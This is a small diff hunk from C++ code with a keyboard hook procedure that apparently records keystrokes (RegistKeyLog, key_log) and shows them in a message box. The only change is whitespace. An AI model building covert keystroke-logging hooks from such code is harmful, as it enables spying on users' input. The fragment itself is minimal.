@@ -35,7 +35,7 @@ LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
         RegistKeyLog(wParam);
         MyMessageBox(key_log);
     }
-
+    
     /*if (bin[0] == 1 && bin[29] == 0)
     {
         key_log = std::to_string(stloke);
